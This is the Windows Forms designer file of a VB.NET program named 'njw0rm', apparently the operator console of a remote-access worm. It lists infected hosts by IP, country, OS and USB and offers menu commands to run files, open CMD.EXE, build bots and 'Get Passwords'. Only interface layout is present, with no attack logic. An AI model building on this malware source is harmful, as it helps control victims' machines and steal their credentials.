<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RunFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.ScriptToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.CMDEXEToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.BuilderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.Lv1 = New njw0rm.LV
        Me.ColumnHeader1 = New System.Windows.Forms.ColumnHeader
        Me.ColumnHeader2 = New System.Windows.Forms.ColumnHeader
        Me.ColumnHeader3 = New System.Windows.Forms.ColumnHeader
        Me.ColumnHeader4 = New System.Windows.Forms.ColumnHeader
        Me.ColumnHeader6 = New System.Windows.Forms.ColumnHeader
        Me.ColumnHeader5 = New System.Windows.Forms.ColumnHeader
        Me.ColumnHeader7 = New System.Windows.Forms.ColumnHeader
        Me.GetPasswordsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.ContextMenuStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RunFileToolStripMenuItem, Me.ScriptToolStripMenuItem, Me.CMDEXEToolStripMenuItem, Me.UpdateToolStripMenuItem, Me.UninstallToolStripMenuItem, Me.BuilderToolStripMenuItem, Me.AboutToolStripMenuItem, Me.GetPasswordsToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.ContextMenuStrip1.ShowImageMargin = False
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(128, 202)
        '
        'RunFileToolStripMenuItem
        '
        Me.RunFileToolStripMenuItem.Name = "RunFileToolStripMenuItem"
        Me.RunFileToolStripMenuItem.Size = New System.Drawing.Size(127, 22)
        Me.RunFileToolStripMenuItem.Text = "Run File"
        '
        'ScriptToolStripMenuItem
        '
        Me.ScriptToolStripMenuItem.Name = "ScriptToolStripMenuItem"
        Me.ScriptToolStripMenuItem.Size = New System.Drawing.Size(127, 22)
        Me.ScriptToolStripMenuItem.Text = "Autoit Script"
        '
        'CMDEXEToolStripMenuItem
        '
        Me.CMDEXEToolStripMenuItem.Name = "CMDEXEToolStripMenuItem"
        Me.CMDEXEToolStripMenuItem.Size = New System.Drawing.Size(127, 22)
        Me.CMDEXEToolStripMenuItem.Text = "CMD.EXE"
        '
        'UpdateToolStripMenuItem
        '
        Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(127, 22)
        Me.UpdateToolStripMenuItem.Text = "Update"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(127, 22)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'BuilderToolStripMenuItem
        '
        Me.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem"
        Me.BuilderToolStripMenuItem.Size = New System.Drawing.Size(127, 22)
        Me.BuilderToolStripMenuItem.Text = "Builder"
        '
        'AboutToolStripMenuItem
        '
        Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(127, 22)
        Me.AboutToolStripMenuItem.Text = "About"
        '
        'Timer1
        '
        '
        'Lv1
        '
        Me.Lv1.BackColor = System.Drawing.Color.Black
        Me.Lv1.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.Lv1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader6, Me.ColumnHeader5, Me.ColumnHeader7})
        Me.Lv1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.Lv1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Lv1.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.Lv1.ForeColor = System.Drawing.Color.IndianRed
        Me.Lv1.FullRowSelect = True
        Me.Lv1.Location = New System.Drawing.Point(0, 0)
        Me.Lv1.Name = "Lv1"
        Me.Lv1.Size = New System.Drawing.Size(546, 257)
        Me.Lv1.TabIndex = 0
        Me.Lv1.UseCompatibleStateImageBehavior = False
        Me.Lv1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "Name"
        Me.ColumnHeader1.Width = 101
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "IP"
        Me.ColumnHeader2.Width = 88
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Country"
        Me.ColumnHeader3.Width = 62
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "OS"
        Me.ColumnHeader4.Width = 96
        '
        'ColumnHeader6
        '
        Me.ColumnHeader6.Text = "Ver."
        Me.ColumnHeader6.Width = 34
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "USB"
        Me.ColumnHeader5.Width = 38
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.Text = "Active Window"
        Me.ColumnHeader7.Width = 125
        '
        'GetPasswordsToolStripMenuItem
        '
        Me.GetPasswordsToolStripMenuItem.Name = "GetPasswordsToolStripMenuItem"
        Me.GetPasswordsToolStripMenuItem.Size = New System.Drawing.Size(127, 22)
        Me.GetPasswordsToolStripMenuItem.Text = "Get Passwords"
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(546, 257)
        Me.Controls.Add(Me.Lv1)
        Me.DoubleBuffered = True
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "njw0rm"
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents Lv1 As njw0rm.LV
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader6 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader5 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RunFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents ScriptToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CMDEXEToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ColumnHeader7 As System.Windows.Forms.ColumnHeader
    Friend WithEvents AboutToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents BuilderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GetPasswordsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem

End Class
